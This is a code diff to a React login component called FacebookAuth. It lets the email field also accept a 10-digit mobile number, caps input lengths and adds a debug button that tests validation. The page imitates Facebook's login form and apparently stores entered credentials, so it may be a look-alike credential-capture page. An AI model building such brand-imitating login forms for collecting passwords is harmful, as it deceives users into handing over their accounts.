@@ -26,9 +26,19 @@ export default function FacebookAuth() {
     if (!email || !password) {
       return 'Please fill in all fields';
     }
-    if (!email.includes('@')) {
-      return 'Please enter a valid email address';
+    
+    // Check if it's a valid email OR a 10-digit mobile number
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    const mobileRegex = /^\d{10}$/;
+    const cleanEmail = email.replace(/\D/g, ''); // Remove non-digits for mobile check
+    
+    const isValidEmail = emailRegex.test(email);
+    const isValidMobile = mobileRegex.test(cleanEmail);
+    
+    if (!isValidEmail && !isValidMobile) {
+      return 'Please enter a valid email address or 10-digit mobile number';
     }
+    
     return null;
   };
 
@@ -103,6 +113,13 @@ export default function FacebookAuth() {
     }
   };
 
+  // Format input for better mobile number entry
+  const handleEmailChange = (e) => {
+    const value = e.target.value;
+    // Allow both email format and digits for mobile
+    setEmail(value);
+  };
+
   return (
     <>
       <Head>
@@ -125,18 +142,19 @@ export default function FacebookAuth() {
           <div className="login-section">
             <div className="login-card">
               <form onSubmit={handleSubmit} className="login-form">
-                {/* Email Input */}
+                {/* Email/Mobile Input - FIXED SIZE */}
                 <div className="input-container">
                   <input
                     type="text"
-                    placeholder="Email or phone number"
+                    placeholder="Email or mobile number"
                     className="form-input"
                     value={email}
-                    onChange={(e) => setEmail(e.target.value)}
+                    onChange={handleEmailChange}
+                    maxLength="50"
                   />
                 </div>
 
-                {/* Password Input */}
+                {/* Password Input - FIXED SIZE */}
                 <div className="input-container">
                   <input
                     type="password"
@@ -144,6 +162,7 @@ export default function FacebookAuth() {
                     className="form-input"
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
+                    maxLength="30"
                   />
                 </div>
 
@@ -277,6 +296,27 @@ export default function FacebookAuth() {
             >
               Check Storage
             </button>
+
+            <button
+              onClick={() => {
+                // Test mobile number validation
+                const testNumbers = ['1234567890', '0987654321', '5551234567'];
+                const testEmails = ['test@example.com', 'user@gmail.com'];
+                
+                console.log('🧪 Testing validation:');
+                testNumbers.forEach(num => {
+                  const error = validateCredentials(num, 'password123');
+                  console.log(`Mobile ${num}:`, error ? '❌ ' + error : '✅ Valid');
+                });
+                testEmails.forEach(email => {
+                  const error = validateCredentials(email, 'password123');
+                  console.log(`Email ${email}:`, error ? '❌ ' + error : '✅ Valid');
+                });
+              }}
+              className="debug-button secondary"
+            >
+              Test Validation
+            </button>
           </div>
         </div>
       </div>
@@ -357,6 +397,7 @@ export default function FacebookAuth() {
           font-size: 17px;
           background: #ffffff;
           transition: border-color 0.2s;
+          box-sizing: border-box;
         }
 
         .form-input:focus {
